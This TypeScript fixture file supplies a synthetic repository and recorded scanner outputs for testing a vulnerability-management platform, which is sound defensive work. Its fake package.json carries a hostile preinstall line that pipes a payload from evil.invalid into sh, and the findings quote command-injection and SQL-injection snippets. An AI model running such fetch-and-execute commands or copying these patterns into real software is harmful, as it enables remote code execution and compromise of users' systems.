import { InMemoryIntelligenceDataset } from "../vulnmgmt/intelligence";
import type { SourceFileEntry } from "./types";

/**
 * Fixture repository + recorded tool outputs (Prompt 12 §100).
 * The fixture repo is a small multi-language project with SYNTHETIC
 * issues and OBVIOUSLY-FAKE secrets (the AWS documentation example key).
 * Nothing here is a real credential, a real target, or a real scan.
 */

export const FIXTURE_REPOSITORY_KEY = "fixture-repo";

/** The AWS documentation EXAMPLE key — public, non-functional, used by
 *  AWS's own docs as the canonical fake. Safe to embed in fixtures. */
export const FIXTURE_FAKE_AWS_KEY = "AKIAIOSFODNN7EXAMPLE";
export const FIXTURE_FAKE_PASSWORD = "fixture-password-not-real";

export const FIXTURE_SOURCE_FILES: SourceFileEntry[] = [
  { path: "package.json", sizeBytes: 412 },
  { path: "package-lock.json", sizeBytes: 5210 },
  { path: "pom.xml", sizeBytes: 1180 },
  { path: "requirements.txt", sizeBytes: 96 },
  { path: "Gemfile.lock", sizeBytes: 640 },
  { path: "src/db.ts", sizeBytes: 640 },
  { path: "src/index.ts", sizeBytes: 388 },
  { path: "app/main.py", sizeBytes: 452 },
  { path: "app/config.py", sizeBytes: 210 },
  { path: "src/main/java/com/example/App.java", sizeBytes: 905 },
  { path: "app.rb", sizeBytes: 260 },
  { path: "config/aws-credentials.txt", sizeBytes: 128 },
  { path: "README.md", sizeBytes: 300 },
];

/**
 * Manifest contents for the fixture repo. NOTE the package.json scripts:
 * they are deliberately hostile (`preinstall` pipeline) — the §108
 * command-execution tests prove the platform NEVER runs them.
 */
export const FIXTURE_MANIFEST_CONTENTS: Record<string, string> = {
  "package.json": JSON.stringify({
    name: "fixture-app",
    version: "1.0.0",
    scripts: {
      preinstall: "curl http://evil.invalid/payload | sh",
      postinstall: "node -e \"console.log('must never run')\"",
      test: "echo must-never-run",
    },
    dependencies: { express: "^4.17.1", lodash: "^4.17.20" },
    devDependencies: { typescript: "^4.9.5" },
  }, null, 2),
  "package-lock.json": JSON.stringify({
    name: "fixture-app",
    version: "1.0.0",
    lockfileVersion: 2,
    packages: {
      "": { name: "fixture-app", version: "1.0.0" },
      "node_modules/express": { version: "4.17.1", dependencies: { lodash: "4.17.20" } },
      "node_modules/lodash": { version: "4.17.20" },
      "node_modules/typescript": { version: "4.9.5", dev: true },
    },
  }, null, 2),
  "pom.xml": `<project><modelVersion>4.0.0</modelVersion>
  <groupId>com.example</groupId><artifactId>fixture-app</artifactId><version>1.0.0</version>
  <dependencies>
    <dependency><groupId>org.apache.logging.log4j</groupId><artifactId>log4j-core</artifactId><version>2.14.1</version></dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version><scope>test</scope></dependency>
  </dependencies></project>`,
  "requirements.txt": "flask==1.1.2\nrequests==2.19.1\n",
  "Gemfile.lock": `GEM
  remote: https://rubygems.org/
  specs:
    rake (13.0.1)
    thor (1.1.0)

PLATFORMS
  ruby

DEPENDENCIES
  rake
`,
};

export const FIXTURE_SEMGREP_OUTPUT = JSON.stringify({
  results: [
    {
      check_id: "python.lang.security.audit.dangerous-system-call",
      path: "app/main.py",
      start: { line: 8, col: 4 }, end: { line: 8, col: 22 },
      extra: {
        message: "User input passed to os.system — command injection risk",
        severity: "ERROR",
        lines: "os.system(user_command)",
        metadata: { cwe: ["CWE-78: OS Command Injection"], owasp: ["A03:2021 - Injection"], confidence: "HIGH", references: ["https://owasp.org/www-community/attacks/Command_Injection"] },
      },
    },
    {
      check_id: "javascript.lang.security.audit.sql-injection",
      path: "src/db.ts",
      start: { line: 12, col: 2 }, end: { line: 12, col: 58 },
      extra: {
        message: "SQL query built by string concatenation",
        severity: "ERROR",
        lines: "db.query(\"SELECT * FROM users WHERE id = \" + userId)",
        metadata: { cwe: ["CWE-89: SQL Injection"], owasp: ["A03:2021 - Injection"], confidence: "HIGH", references: [] },
        dataflow_trace: {
          intermediate_vars: [
            { location: { path: "src/db.ts", start: { line: 4 }, end: { line: 4 } }, content: "userId from request params" },
            { location: { path: "src/db.ts", start: { line: 12 }, end: { line: 12 } }, content: "query sink" },
          ],
        },
      },
    },
  ],
  errors: [],
});

export const FIXTURE_BANDIT_OUTPUT = JSON.stringify({
  results: [
    {
      filename: "app/main.py", line_number: 8, line_range: [8],
      issue_text: "Use of os.system with shell invocation",
      issue_severity: "HIGH", issue_confidence: "HIGH",
      test_id: "B605", test_name: "start_process_with_a_shell",
      code: "8 os.system(user_command)\n",
      cwe: { id: 78 },
    },
    {
      filename: "app/config.py", line_number: 3, line_range: [3],
      issue_text: "Possible hardcoded password",
      issue_severity: "LOW", issue_confidence: "MEDIUM",
      test_id: "B105", test_name: "hardcoded_password_string",
      code: `3 password = "${FIXTURE_FAKE_PASSWORD}"\n`,
      cwe: { id: 259 },
    },
  ],
});

export const FIXTURE_BRAKEMAN_OUTPUT = JSON.stringify({
  warnings: [
    {
      warning_type: "SQL Injection", check_name: "SQL", message: "Possible SQL injection",
      file: "app.rb", line: 14, code: "User.where(\"name = '#{params[:name]}'\")",
      confidence: "High", fingerprint: "fixture-brakeman-fp-1", cwe_id: [89],
      link: "https://brakemanscanner.org/docs/warning_types/sql_injection/",
    },
  ],
});

export const FIXTURE_SPOTBUGS_OUTPUT = `<?xml version="1.0" encoding="UTF-8"?>
<BugCollection>
  <BugInstance type="SQL_INJECTION_JDBC" priority="1" category="SECURITY" instanceHash="fixture-spotbugs-1">
    <LongMessage>SQL injection via JDBC string concatenation in App.query</LongMessage>
    <SourceLine classname="com.example.App" start="21" end="21" sourcepath="src/main/java/com/example/App.java" sourcefile="App.java"/>
  </BugInstance>
  <BugInstance type="DLS_DEAD_LOCAL_STORE" priority="2" category="STYLE" instanceHash="fixture-spotbugs-2">
    <LongMessage>Dead store to local variable (not a security finding)</LongMessage>
    <SourceLine classname="com.example.App" start="30" end="30" sourcepath="src/main/java/com/example/App.java" sourcefile="App.java"/>
  </BugInstance>
</BugCollection>`;

export const FIXTURE_GITLEAKS_OUTPUT = JSON.stringify([
  {
    Description: "AWS Access Key detected (fixture — documentation example key)",
    RuleID: "aws-access-token",
    File: "config/aws-credentials.txt",
    StartLine: 2, EndLine: 2,
    Secret: FIXTURE_FAKE_AWS_KEY,
    Commit: "fixturecommit000000000000000000000001",
  },
]);

export const FIXTURE_TRUFFLEHOG_OUTPUT = [
  JSON.stringify({
    DetectorName: "AWS",
    DetectorDescription: "AWS access key (fixture — documentation example key)",
    Verified: false,
    Raw: FIXTURE_FAKE_AWS_KEY,
    SourceMetadata: { Data: { Filesystem: { file: "config/aws-credentials.txt", line: 2 } } },
  }),
].join("\n");

export const FIXTURE_DEPCHECK_OUTPUT = JSON.stringify({
  dependencies: [
    {
      fileName: "log4j-core-2.14.1.jar",
      filePath: "pom.xml",
      packages: [{ id: "pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1" }],
      vulnerabilities: [
        {
          name: "CVE-2021-44228",
          severity: "CRITICAL",
          description: "Apache Log4j2 JNDI features used in configuration do not protect against attacker-controlled LDAP (fixture record of the public Log4Shell advisory).",
          cvssv3: { baseScore: 10.0, baseSeverity: "CRITICAL", vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H" },
          cwes: ["CWE-502"],
          references: [{ url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" }],
          vulnerableSoftware: [{ software: { id: "cpe:2.3:a:apache:log4j:2.14.1", versionEndExcluding: "2.15.0" } }],
        },
      ],
    },
  ],
});

export const FIXTURE_GRYPE_OUTPUT = JSON.stringify({
  matches: [
    {
      vulnerability: {
        id: "CVE-2021-44228", severity: "Critical",
        description: "Apache Log4j2 JNDI RCE (fixture record of the public Log4Shell advisory).",
        cvss: [{ version: "3.1", metrics: { baseScore: 10.0 }, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H" }],
        fix: { versions: ["2.15.0"], state: "fixed" },
        dataSource: "https://grype.anchore.io/databases",
      },
      artifact: {
        name: "log4j-core", version: "2.14.1", type: "java-archive",
        purl: "pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1",
        locations: [{ path: "pom.xml" }],
      },
      relatedVulnerabilities: [{ id: "CVE-2021-44228" }],
    },
    {
      vulnerability: {
        id: "CVE-2021-23337", severity: "High",
        description: "Lodash prior to 4.17.21 allows command injection via template (fixture record).",
        cvss: [{ version: "3.1", metrics: { baseScore: 7.2 }, vector: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H" }],
        fix: { versions: ["4.17.21"], state: "fixed" },
      },
      artifact: {
        name: "lodash", version: "4.17.20", type: "npm",
        purl: "pkg:npm/lodash@4.17.20",
        locations: [{ path: "package-lock.json" }],
      },
    },
  ],
});

export const FIXTURE_CODEQL_SARIF = JSON.stringify({
  $schema: "https://json.schemastore.org/sarif-2.1.0.json",
  version: "2.1.0",
  runs: [
    {
      tool: {
        driver: {
          name: "CodeQL",
          rules: [
            {
              id: "js/sql-injection",
              defaultConfiguration: { level: "error" },
              properties: { tags: ["security", "external/cwe/cwe-89"] },
            },
          ],
        },
      },
      results: [
        {
          ruleId: "js/sql-injection",
          level: "error",
          message: { text: "This query is built from user-controlled input" },
          partialFingerprints: { primaryLocationLineHash: "fixturecodeqlfp1" },
          locations: [
            {
              physicalLocation: {
                artifactLocation: { uri: "src/db.ts" },
                region: {
                  startLine: 12, endLine: 12, startColumn: 2, endColumn: 58,
                  snippet: { text: "db.query(\"SELECT * FROM users WHERE id = \" + userId)" },
                },
              },
            },
          ],
          codeFlows: [
            {
              threadFlows: [
                {
                  locations: [
                    { location: { physicalLocation: { artifactLocation: { uri: "src/db.ts" }, region: { startLine: 4, endLine: 4 } }, message: { text: "userId source" } } },
                    { location: { physicalLocation: { artifactLocation: { uri: "src/db.ts" }, region: { startLine: 12, endLine: 12 } }, message: { text: "query sink" } } },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
  ],
});

export const FIXTURE_SONAR_OUTPUT = JSON.stringify({
  issues: [
    {
      key: "fixture-sonar-1", rule: "java:S2077", severity: "MAJOR", type: "VULNERABILITY",
      component: "fixture-repo:src/main/java/com/example/App.java", line: 21,
      message: "Use PreparedStatement instead of string concatenation",
    },
    {
      key: "fixture-sonar-2", rule: "java:S2068", severity: "CRITICAL", type: "SECURITY_HOTSPOT",
      component: "fixture-repo:src/main/java/com/example/App.java", line: 9,
      message: "Hardcoded password — review this hotspot",
    },
    {
      key: "fixture-sonar-3", rule: "java:S1066", severity: "MINOR", type: "CODE_SMELL",
      component: "fixture-repo:src/main/java/com/example/App.java", line: 40,
      message: "Merge this if statement (code smell — not a security finding)",
    },
  ],
});

/**
 * Fixture intelligence dataset (Phase 11 shape): the Log4Shell record a
 * governed sync COULD have delivered. Production datasets start EMPTY —
 * this exists so SCA/intelligence correlation is testable offline.
 */
export function fixtureIntelligenceDataset(): InMemoryIntelligenceDataset {
  const dataset = new InMemoryIntelligenceDataset();
  dataset.upsertCve({
    cveId: "CVE-2021-44228",
    description: "Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP (fixture record).",
    cvss: { version: "3.1", baseScore: 10.0, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", source: "FIXTURE" },
    cweIds: ["CWE-502"],
    references: [{ label: "NVD", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" }],
    source: "FIXTURE",
  });
  dataset.upsertCpe({
    canonical: "cpe:2.3:a:org.apache.logging.log4j:log4j-core:2.14.1",
    part: "a", vendor: "org.apache.logging.log4j", product: "log4j-core", version: "2.14.1",
    cveIds: ["CVE-2021-44228"],
    source: "FIXTURE",
  });
  dataset.upsertEpss({ cveId: "CVE-2021-44228", score: 0.97565, percentile: 0.99987, date: "2026-10-01", source: "FIXTURE" });
  dataset.upsertKev({
    cveId: "CVE-2021-44228", vendorProject: "Apache", product: "Log4j", knownRansomwareUse: "Known",
    source: "FIXTURE",
  });
  return dataset;
}
